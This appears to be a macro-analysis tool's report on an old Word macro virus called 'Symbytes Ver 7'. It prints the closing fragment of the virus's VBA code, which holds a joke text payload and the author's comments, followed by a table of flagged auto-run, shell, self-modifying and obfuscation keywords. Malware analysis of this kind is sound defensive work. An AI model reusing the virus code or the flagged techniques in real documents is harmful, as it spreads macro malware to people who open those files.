ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
'WORD/SymbytesVer7 written by "The Mahatma"
'Works in both Word 2000 and Word 97
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
If Day(Now) = Minute(Now) Then Selection.TypeText " Symbytes Ver. 7.x mucking about..The Mahatma."
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

